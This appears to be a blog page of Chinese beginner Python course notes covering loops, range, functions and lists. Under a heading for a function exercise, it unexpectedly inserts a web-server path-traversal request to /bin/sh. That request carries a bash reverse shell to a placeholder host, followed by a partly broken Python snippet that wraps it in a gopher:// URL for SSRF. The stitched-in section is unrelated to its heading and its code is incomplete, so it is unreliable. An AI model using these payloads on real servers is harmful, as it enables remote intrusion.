class="built_in">print</span>(<span class="string">&quot;猜测结果大了&quot;</span>)</span><br><span class="line">    num1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请您进行第二次猜测，共三次机会：&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> num1 == num :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;恭喜你，猜对了&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> num1 &gt;= num:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;猜测结果大了&quot;</span>)</span><br><span class="line">        num1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请您进行第三次猜测，共三次机会：&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> num1 == num :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;恭喜你，猜对了&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;您已猜错三次，正确数字是<span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;猜测结果小了&quot;</span>)</span><br><span class="line">        num1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请您进行第三次猜测，共三次机会：&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> num1 == num :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;恭喜你，猜对了&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;您已猜错三次，正确数字是<span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;猜测结果小了&quot;</span>)</span><br><span class="line">    num1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请您进行第二次猜测，共三次机会：&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> num1 == num:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;恭喜你，猜对了&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> num1 &gt;= num:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;猜测结果大了&quot;</span>)</span><br><span class="line">        num1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请您进行第三次猜测，共三次机会：&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> num1 == num:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;恭喜你，猜对了&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;您已猜错三次，正确数字是<span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;猜测结果小了&quot;</span>)</span><br><span class="line">        num1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请您进行第三次猜测，共三次机会：&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> num1 == num:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;恭喜你，猜对了&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;您已猜错三次，正确数字是<span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="23while循环的基础运用-py"><a href="#23while循环的基础运用-py" class="headerlink" title="23while循环的基础运用.py"></a>23while循环的基础运用.py</h2><p>while 条件（布尔类型，或者比较运算）：<br>    条件满足时，做的事情1<br>具体的案列，小妹心软，我只要表白一百次就可以成功</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">100</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;小美我喜欢你&quot;</span>)</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;这是打印的<span class="subst">&#123;i&#125;</span>次&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="24while循环案列-py"><a href="#24while循环案列-py" class="headerlink" title="24while循环案列.py"></a>24while循环案列.py</h2><p>求1-100的和<br>需求：通过while循环，计算从1累加到100的和<br>提示：不要忘记条件，设置确保while循环100次<br>确保累加的数字，从1开始，到100结束</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">101</span>:</span><br><span class="line">    j = j + i</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">100</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;1-100的和为<span class="subst">&#123;j&#125;</span>&quot;</span>)</span><br><span class="line">    i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="25while循环猜数字-py"><a href="#25while循环猜数字-py" class="headerlink" title="25while循环猜数字.py"></a>25while循环猜数字.py</h2><p>设置一个范围为1-100的随机整数变量，通过while循环，配合input语句，判断输入的数字是否等于随机数<br>·无限次机会，知道猜中为止<br>·每一次猜完之后，判断说数字是打了还是小了<br>猜完数字之后，提示猜了几次<br>随机数使用<br>import random<br>num &#x3D; random.randint(1,100)</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">num = random.randint(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请输入你猜测的数字：&quot;</span>)</span><br><span class="line">    j = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    <span class="keyword">if</span> j == num:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;你猜了<span class="subst">&#123;k&#125;</span>次,第<span class="subst">&#123;k&#125;</span>次猜对了&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> j &lt;= num:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;小了&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;大了&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;你猜了<span class="subst">&#123;k&#125;</span>次没有猜对&quot;</span>)</span><br><span class="line">    k = k + <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="26while循环的嵌套使用-py"><a href="#26while循环的嵌套使用-py" class="headerlink" title="26while循环的嵌套使用.py"></a>26while循环的嵌套使用.py</h2><p>向小美表白100天，每一天都会送出10朵玫瑰花</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">100</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;今天是第<span class="subst">&#123;i&#125;</span>天，准备表白......&quot;</span>)</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j &lt;= <span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;送给小美的第<span class="subst">&#123;j&#125;</span>朵玫瑰花&quot;</span>)</span><br><span class="line">        j = j + <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;小美，我喜欢你&quot;</span>)</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;坚持到第<span class="subst">&#123;i-<span class="number">1</span>&#125;</span>天，表白成功了&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="27while循环案列-九九乘法表-py"><a href="#27while循环案列-九九乘法表-py" class="headerlink" title="27while循环案列-九九乘法表.py"></a>27while循环案列-九九乘法表.py</h2><p>使用我们的while循环，打印九九乘法表<br>默认的print语句输出内容会自动换行，在即将完成的案列中，我们需要使用print语句，输出不<br>换行的功能，非常简单<br>print(“hello”,end&#x3D;’’)这样就不换行了<br>还是说，要自己写最好<br>黑马这里是后面加上了一个\t功能</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">9</span>:</span><br><span class="line">    <span class="keyword">while</span> j &lt;= i:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;j&#125;</span>*<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;i*j&#125;</span>&quot;</span>,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        j = j + <span class="number">1</span></span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="28for循环的基础知识-py"><a href="#28for循环的基础知识-py" class="headerlink" title="28for循环的基础知识.py"></a>28for循环的基础知识.py</h2><p>基本语法还是很简单的<br>for 临时变量 in 待处理数据集:<br>    循环满足条件时执行的代码（可以是数字，也可以是字符串呀等等）<br>（意思就是将我们的待处理的数据集一个个带入临时变量去试）</p>
+<h2 id="29range语句-py"><a href="#29range语句-py" class="headerlink" title="29range语句.py"></a>29range语句.py</h2><p>对于上节课讲的待处理数据集，严格来说被称为：序列类型<br>序列类型指的是，其内容可以被一个个一次取出的一种类型，包括：<br>字符串<br>列表<br>元组<br>后面会详细的讲<br>通过学习range语句，获得一个简单的数字序列<br>range(num)获取一个从0开始，到num结束的数字序列（不含num本身）<br>如range(5)获得的就是[0,1,2,3,4]<br>语法2：range(num1,num2)，range(5,10)取得的数据就是[5,6,7,8,9]<br>语法3：range(num1,num2,step)获得一个从num1开始，到num2结束的数字序列（不含num2本身）<br>数字之间的步长，以step为主，默认为1<br>如range(5,10,2)取得的数据就是[5,7,9]</p>
+<h2 id="30for循环临时变量作用域-py"><a href="#30for循环临时变量作用域-py" class="headerlink" title="30for循环临时变量作用域.py"></a>30for循环临时变量作用域.py</h2><p>…….</p>
+<h2 id="31for循环的嵌套使用-py"><a href="#31for循环的嵌套使用-py" class="headerlink" title="31for循环的嵌套使用.py"></a>31for循环的嵌套使用.py</h2><p>for循环打印九九乘法表<br>ok,也是自己做了出了，没有什么问题</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,i+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;j&#125;</span>*<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;j*i&#125;</span>&quot;</span>,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="32continue和break的使用-py"><a href="#32continue和break的使用-py" class="headerlink" title="32continue和break的使用.py"></a>32continue和break的使用.py</h2><p>for i in range(1,100):<br>    语句1<br>    continue<br>    语句2<br>在这里，我们就直接进入了下一个循环，所以语句2是不会执行的，语句1会按照正常次数一直执行下去<br>如果是有两层循环的话，那么如果continue在内层的话，触发continue后就会继续执行内层循环<br>break<br>for i in range(1,100):<br>    语句1<br>    break<br>    语句2<br>语句3<br>这样就只会执行一次语句1然后就直接执行语句3了</p>
+<h2 id="33循环综合案列-py"><a href="#33循环综合案列-py" class="headerlink" title="33循环综合案列.py"></a>33循环综合案列.py</h2><p>…</p>
+<h2 id="34函数的初体验-py"><a href="#34函数的初体验-py" class="headerlink" title="34函数的初体验.py"></a>34函数的初体验.py</h2><p>函数：是组织好的，可重复使用的，用来实现特定功能的代码块<br>已经组织好的，可重复使用，针对特定功能<br>为什么要使用函数，减少重复性工作，提高开发效率<br>案例：不适用内置函数len(),完成字符串长度的计算</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&quot;itheima&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;itcast&quot;</span></span><br><span class="line">str3 = <span class="string">&quot;python&quot;</span></span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">    count =count + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;字符串长度<span class="subst">&#123;str1&#125;</span>的长度是：<span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str2:</span><br><span class="line">    count =count + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;字符串长度<span class="subst">&#123;str2&#125;</span>的长度是：<span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str3:</span><br><span class="line">    count =count + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;字符串长度<span class="subst">&#123;str3&#125;</span>的长度是：<span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#上面的内容过于重复了</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_len</span>(<span class="params">data</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;字符串<span class="subst">&#123;data&#125;</span>的长度是<span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用</span></span><br><span class="line">my_len(str1)</span><br><span class="line">my_len(str2)</span><br><span class="line">my_len(str3)</span><br></pre></td></tr></table></figure>
+
+<h2 id="35函数的基础定义-py"><a href="#35函数的基础定义-py" class="headerlink" title="35函数的基础定义.py"></a>35函数的基础定义.py</h2><p>掌握函数的基础定义语法<br>def 函数名(传入参数):<br>    函数体<br>    return 返回值</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#定义一个函数，输出相关信息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say_hi</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hi&quot;</span>)</span><br><span class="line"></span><br><span class="line">say_hi()</span><br><span class="line"><span class="comment">#结果：hi</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="36函数基础定义练习-py"><a href="#36函数基础定义练习-py" class="headerlink" title="36函数基础定义练习.py"></a>36函数基础定义练习.py</h2><p>有点太简单了</p>
+<h2 id="37函数的传入参数-py"><a href="#37函数的传入参数-py" class="headerlink" title="37函数的传入参数.py"></a>37函数的传入参数.py</h2><p>def add(x,y):<br>    result &#x3D; x + y<br>    print(f”x+y的值为{x+y}”)</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x,y</span>):</span><br><span class="line">    result = x + y</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;x+y的值为<span class="subst">&#123;x+y&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="comment">#结果：x+y的值为7</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="38函数的参数练习-py"><a href="#38函数的参数练习-py" class="headerlink" title="38函数的参数练习.py"></a>38函数的参数练习.py</h2><p>需求：定义一个函数，名称任意，并接受一个参数的传入（数字类型，表示体温）<br>在函数内进行体温判断（正常范围：小于等于37.5度），并输出如下内容<br>欢迎来到黑马程序员！请出示您的健康码以及72小时核算证明，并配合测量体温！<br>体温测量中，您的体温是：37.3度，体温正常请进！<br>欢迎来到黑马程序员！请出示您的健康码以及72小时核算证明，并配合测量体温！<br>体温测量中，您的体温是：39.3度，需要隔离</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tem</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> x&lt;=<span class="number">37.5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;欢迎来到黑马程序员！请出示您的健康码以及72小时核算证明，并配合测量体温！\n体温测量中，您的体温是：<span class="subst">&#123;x&#125;</span>度，体温正常请进！&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> x &lt; <span class="number">35</span> <span class="keyword">or</span> x &gt; <span class="number">40</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入的体温错误&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;欢迎来到黑马程序员！请出示您的健康码以及72小时核算证明，并配合测量体温！\n体温测量中，您的体温是：<span class="subst">&#123;x&#125;</span>度，需要隔离&quot;</span>)</span><br><span class="line"></span><br><span class="line">tem(<span class="number">40</span>)</span><br><span class="line">tem(<span class="number">36</span>)</span><br><span class="line">tem(<span class="number">37.5</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="39函数的返回值定义语法-py"><a href="#39函数的返回值定义语法-py" class="headerlink" title="39函数的返回值定义语法.py"></a>39函数的返回值定义语法.py</h2><p>1.掌握函数返回值的作用<br>2.掌握函数返回值的定义语法<br>通过返回值，将相加的结果返回给调用者</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x,y</span>):</span><br><span class="line">    result = x + y</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">r = add(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;x+y的结果是<span class="subst">&#123;r&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment">#结果：x+y的结果是3。记得返回一下我们需要的返回值</span></span><br><span class="line"><span class="comment">#注意：函数有了return之后，后面的内容就不执行了</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="40函数的返回值之None类型-py"><a href="#40函数的返回值之None类型-py" class="headerlink" title="40函数的返回值之None类型.py"></a>40函数的返回值之None类型.py</h2><p>思考：如果函数没有使用return语句返回数据，那么函数有返回值吗<br>实际上是：有<br>python中有一个特殊的字面量：None,其类型是：&lt;class’NoneType’&gt;<br>无返回值的函数，实际上就是返回了：None这个字面量<br>也可以主动返回：return None<br>用在if判断上，None等同于False<br>一般用于在函数中主动返回None,配合if判断做相关处理<br>还可以用于声明变量，比如一些变量我一开始是不需要去定义的，这种情况下就可以去用None这个来代替<br>name &#x3D; None</p>
+<h2 id="41函数的说明文档-py"><a href="#41函数的说明文档-py" class="headerlink" title="41函数的说明文档.py"></a>41函数的说明文档.py</h2><p>我们可通过添加函数的说明文档，理解函数的作用<br>语法如下：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    函数说明</span></span><br><span class="line"><span class="string">    :param x:形参x的说明</span></span><br><span class="line"><span class="string">    :param y:形参y的说明</span></span><br><span class="line"><span class="string">    :return:返回值的说明</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;x+y&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="42函数的嵌套调用-py"><a href="#42函数的嵌套调用-py" class="headerlink" title="42函数的嵌套调用.py"></a>42函数的嵌套调用.py</h2><p>1.掌握函数的嵌套调用<br>2.理解嵌套调用的执行流程</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_b</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;---2---&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_a</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;---1---&quot;</span>)</span><br><span class="line">    func_b()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;---3---&quot;</span>)</span><br><span class="line">func_a()</span><br></pre></td></tr></table></figure>
+
+<h2 id="43变量在函数中的作用域-py"><a href="#43变量在函数中的作用域-py" class="headerlink" title="43变量在函数中的作用域.py"></a>43变量在函数中的作用域.py</h2><p>局部变量<br>定义在函数体内部的变量，即在函数内部生效<br>在函数外部调用失败<br>可以使用global声明是全局变量，在函数里面</p>
+<h2 id="44函数的综合案列-py"><a href="#44函数的综合案列-py" class="headerlink" title="44函数的综合案列.py"></a>44函数的综合案列.py</h2><p>POST &#x2F;cgi-bin&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;.%%32%65&#x2F;bin&#x2F;sh HTTP&#x2F;1.1<br>Host: 127.0.0.1:80<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 58</p>
+<p>echo;bash -c ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx&#x2F;9001 0&gt;&amp;1’</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="comment">#注意后面一定要有回车，回车结尾表示http请求结束。</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)       <span class="comment"># 这里因为是GET请求发包所以要进行两次url编码</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="45数据容器入门-py"><a href="#45数据容器入门-py" class="headerlink" title="45数据容器入门.py"></a>45数据容器入门.py</h2><p>如果我想要在程序中，记录五名学生的信息，如姓名<br>那应该不能说，定义五个变量来记录吧<br>name_list &#x3D; [‘man’,’bob’,’jack’,’jerry’,’marry’,’andi’]<br>python中的数据容器，一种可以容纳任何数据的数据类型，容纳的每一份数据成为1个元素</p>
+<h2 id="46列表的定义语法-py"><a href="#46列表的定义语法-py" class="headerlink" title="46列表的定义语法.py"></a>46列表的定义语法.py</h2><p>基本语法<br>#字面量<br>[元素1，元素2，元素3]<br>#定义变量<br>变量名称 &#x3D; [元素1，元素2，元素3]<br>#定义空列表<br>变量名称 &#x3D; []<br>变量名称 &#x3D; list()</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#列表可以一次存储多个数据，且可以为不同的数据类型，支持嵌套</span></span><br><span class="line">my_list = [<span class="string">&#x27;itheima&#x27;</span>,<span class="string">&#x27;666&#x27;</span>,<span class="literal">True</span>]</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(my_list))</span><br></pre></td></tr></table></figure>
+
+<h2 id="47列表的下表索引-py"><a href="#47列表的下表索引-py" class="headerlink" title="47列表的下表索引.py"></a>47列表的下表索引.py</h2><p>列表中存储的数据怎么取出来？<br>下标索引，从0开始，依次递增<br>可以反向索引。也就是从后往前<br>-1，-2，-3一次递减<br>嵌套列表的操作呢？<br>list &#x3D; [[1,2],[3,4]]<br>列表[1][0]就可以被取出来了</p>
+<h2 id="48列表的常用操作方法-py"><a href="#48列表的常用操作方法-py" class="headerlink" title="48列表的常用操作方法.py"></a>48列表的常用操作方法.py</h2><p>掌握列表的常用操作（方法）和特点<br>列表除了可以：<br>·定义<br>·使用下标索引取值<br>还提供了一系列功能：<br>·插入元素<br>·删除元素<br>·清空列表<br>·修改元素<br>·统计元素个数<br>这些都是方法</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 